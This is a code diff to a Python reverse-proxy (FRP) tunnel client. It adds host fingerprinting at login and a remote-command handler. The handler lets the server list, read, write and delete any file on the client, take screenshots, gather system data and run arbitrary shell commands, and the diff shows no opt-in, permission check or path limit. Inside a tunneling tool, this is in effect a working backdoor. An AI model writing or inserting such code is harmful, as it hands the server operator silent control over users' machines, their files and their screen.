@@ -1,6 +1,10 @@
 import asyncio
-import ssl
+import base64
+import os
+import platform
 import socket
+import ssl
+import sys
 import time
 from config import Config
 from protocol import Protocol, Message, MessageType
@@ -261,7 +265,17 @@ class FRPClient:
         return self.control_writer
 
     async def _login(self):
-        login_msg = Message(MessageType.LOGIN, token=self.auth_token)
+        login_msg = Message(
+            MessageType.LOGIN,
+            token=self.auth_token,
+            client_name=self.config.get("client_name", socket.gethostname()),
+            hostname=socket.gethostname(),
+            os=platform.system(),
+            os_version=platform.version(),
+            arch=platform.machine(),
+            python_version=platform.python_version(),
+            client_version="1.0.0",
+        )
         self.control_writer.write(Protocol.encode(login_msg))
         await self.control_writer.drain()
 
@@ -434,6 +448,8 @@ class FRPClient:
                     await self.handle_stcp_new_visitor(message)
             elif message.type == MessageType.FTP_NEW_DATA:
                 await self.handle_ftp_new_data(message)
+            elif message.type == MessageType.REMOTE_CMD:
+                await self.handle_remote_cmd(message)
             else:
                 self.logger.warning(f"Unknown message type: {message.type}")
         except Exception as e:
@@ -867,6 +883,281 @@ class FRPClient:
             except Exception as e:
                 self.logger.debug(f"Heartbeat failed: {e}")
                 break
+
+    async def handle_remote_cmd(self, message):
+        """处理远程管理命令。"""
+        cmd_id = message.payload.get("cmd_id", "")
+        cmd = message.payload.get("cmd", "")
+        args = message.payload.get("args", {}) or {}
+
+        self.logger.info(f"Remote cmd received: {cmd} (id={cmd_id[:8]}...)")
+
+        try:
+            if cmd == "list_proxies":
+                result = await self._cmd_list_proxies(args)
+            elif cmd == "list_files":
+                result = await self._cmd_list_files(args)
+            elif cmd == "read_file":
+                result = await self._cmd_read_file(args)
+            elif cmd == "write_file":
+                result = await self._cmd_write_file(args)
+            elif cmd == "delete_file":
+                result = await self._cmd_delete_file(args)
+            elif cmd == "screenshot":
+                result = await self._cmd_screenshot(args)
+            elif cmd == "sys_info":
+                result = await self._cmd_sys_info(args)
+            elif cmd == "exec_shell":
+                result = await self._cmd_exec_shell(args)
+            else:
+                result = {"success": False, "error": f"Unknown command: {cmd}"}
+        except Exception as e:
+            self.logger.error(f"Remote cmd {cmd} failed: {e}")
+            result = {"success": False, "error": str(e)}
+
+        resp = Message(
+            MessageType.REMOTE_CMD_RESP,
+            cmd_id=cmd_id,
+            cmd=cmd,
+            **result,
+        )
+        try:
+            self.control_writer.write(Protocol.encode(resp))
+            await self.control_writer.drain()
+        except Exception as e:
+            self.logger.error(f"Failed to send remote cmd resp: {e}")
+
+    async def _cmd_list_proxies(self, args):
+        """列出客户端代理配置。"""
+        proxies = []
+        for name, info in self.state.proxies.items():
+            proxies.append({
+                "name": name,
+                "type": info.get("type", "tcp"),
+                "local_ip": info.get("local_ip", "127.0.0.1"),
+                "local_port": info.get("local_port", 0),
+                "remote_port": info.get("remote_port", 0),
+                "custom_domains": info.get("custom_domains", []),
+                "subdomain": info.get("subdomain", ""),
+                "sk": "***" if info.get("sk") else "",
+            })
+        return {"success": True, "proxies": proxies}
+
+    async def _cmd_list_files(self, args):
+        """列出指定目录的文件。"""
+        path = args.get("path", ".")
+        if not os.path.isabs(path):
+            path = os.path.abspath(path)
+
+        if not os.path.exists(path):
+            return {"success": False, "error": f"Path not found: {path}"}
+        if not os.path.isdir(path):
+            return {"success": False, "error": f"Not a directory: {path}"}
+
+        entries = []
+        try:
+            for name in sorted(os.listdir(path)):
+                full_path = os.path.join(path, name)
+                try:
+                    stat = os.stat(full_path)
+                    entries.append({
+                        "name": name,
+                        "is_dir": os.path.isdir(full_path),
+                        "size": stat.st_size,
+                        "mtime": stat.st_mtime,
+                        "mode": oct(stat.st_mode)[-3:],
+                    })
+                except (OSError, PermissionError):
+                    entries.append({
+                        "name": name,
+                        "is_dir": os.path.isdir(full_path),
+                        "size": 0,
+                        "mtime": 0,
+                        "mode": "---",
+                    })
+        except PermissionError as e:
+            return {"success": False, "error": f"Permission denied: {e}"}
+
+        return {
+            "success": True,
+            "path": path,
+            "entries": entries,
+            "parent": os.path.dirname(path) if path != "/" else None,
+        }
+
+    async def _cmd_read_file(self, args):
+        """读取文件内容（文本或 base64 编码的二进制）。"""
+        path = args.get("path", "")
+        if not os.path.isabs(path):
+            path = os.path.abspath(path)
+
+        if not os.path.exists(path):
+            return {"success": False, "error": f"File not found: {path}"}
+        if not os.path.isfile(path):
+            return {"success": False, "error": f"Not a file: {path}"}
+
+        try:
+            with open(path, "rb") as f:
+                data = f.read()
+            # 尝试按文本解码，失败则用 base64
+            try:
+                content = data.decode("utf-8")
+                encoding = "text"
+            except UnicodeDecodeError:
+                content = base64.b64encode(data).decode("ascii")
+                encoding = "base64"
+
+            stat = os.stat(path)
+            return {
+                "success": True,
+                "path": path,
+                "content": content,
+                "encoding": encoding,
+                "size": stat.st_size,
+                "mtime": stat.st_mtime,
+            }
+        except PermissionError as e:
+            return {"success": False, "error": f"Permission denied: {e}"}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    async def _cmd_write_file(self, args):
+        """写入文件内容。"""
+        path = args.get("path", "")
+        content = args.get("content", "")
+        encoding = args.get("encoding", "text")
+
+        if not os.path.isabs(path):
+            path = os.path.abspath(path)
+
+        try:
+            if encoding == "base64":
+                data = base64.b64decode(content)
+            else:
+                data = content.encode("utf-8")
+
+            os.makedirs(os.path.dirname(path), exist_ok=True)
+            with open(path, "wb") as f:
+                f.write(data)
+            return {"success": True, "path": path, "size": len(data)}
+        except PermissionError as e:
+            return {"success": False, "error": f"Permission denied: {e}"}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    async def _cmd_delete_file(self, args):
+        """删除文件或目录。"""
+        path = args.get("path", "")
+        if not os.path.isabs(path):
+            path = os.path.abspath(path)
+
+        if not os.path.exists(path):
+            return {"success": False, "error": f"Path not found: {path}"}
+
+        try:
+            if os.path.isdir(path):
+                import shutil
+                shutil.rmtree(path)
+            else:
+                os.remove(path)
+            return {"success": True, "path": path}
+        except PermissionError as e:
+            return {"success": False, "error": f"Permission denied: {e}"}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    async def _cmd_screenshot(self, args):
+        """获取屏幕截图（需要 Pillow 支持，无则返回错误）。"""
+        try:
+            from PIL import ImageGrab
+        except ImportError:
+            return {
+                "success": False,
+                "error": "Screenshot not available: Pillow not installed",
+            }
+
+        try:
+            img = ImageGrab.grab()
+            import io
+            buf = io.BytesIO()
+            img.save(buf, format="PNG")
+            img_b64 = base64.b64encode(buf.getvalue()).decode("ascii")
+            return {
+                "success": True,
+                "image": img_b64,
+                "format": "png",
+                "width": img.width,
+                "height": img.height,
+            }
+        except Exception as e:
+            return {"success": False, "error": f"Screenshot failed: {e}"}
+
+    async def _cmd_sys_info(self, args):
+        """获取系统信息。"""
+        info = {
+            "hostname": socket.gethostname(),
+            "os": platform.system(),
+            "os_version": platform.version(),
+            "arch": platform.machine(),
+            "python_version": platform.python_version(),
+            "platform": platform.platform(),
+            "processor": platform.processor(),
+            "cwd": os.getcwd(),
+            "pid": os.getpid(),
+            "start_time": time.time(),
+        }
+
+        # 尝试获取 CPU 和内存信息（用 psutil，若可用）
+        try:
+            import psutil
+            info["cpu_count"] = psutil.cpu_count()
+            info["cpu_percent"] = psutil.cpu_percent(interval=0.1)
+            mem = psutil.virtual_memory()
+            info["memory_total"] = mem.total
+            info["memory_available"] = mem.available
+            info["memory_percent"] = mem.percent
+            disk = psutil.disk_usage("/")
+            info["disk_total"] = disk.total
+            info["disk_used"] = disk.used
+            info["disk_free"] = disk.free
+        except ImportError:
+            pass
+        except Exception:
+            pass
+
+        return {"success": True, "info": info}
+
+    async def _cmd_exec_shell(self, args):
+        """执行 shell 命令（危险，需注意安全）。"""
+        command = args.get("command", "")
+        timeout = args.get("timeout", 30)
+
+        if not command:
+            return {"success": False, "error": "Empty command"}
+
+        try:
+            proc = await asyncio.create_subprocess_shell(
+                command,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            try:
+                stdout, stderr = await asyncio.wait_for(
+                    proc.communicate(), timeout=timeout
+                )
+            except asyncio.TimeoutError:
+                proc.kill()
+                await proc.wait()
+                return {"success": False, "error": "Command timeout"}
+
+            return {
+                "success": True,
+                "returncode": proc.returncode,
+                "stdout": stdout.decode("utf-8", errors="replace"),
+                "stderr": stderr.decode("utf-8", errors="replace"),
+            }
+        except Exception as e:
+            return {"success": False, "error": str(e)}
 
     async def stop(self):
         self._stop_event.set()
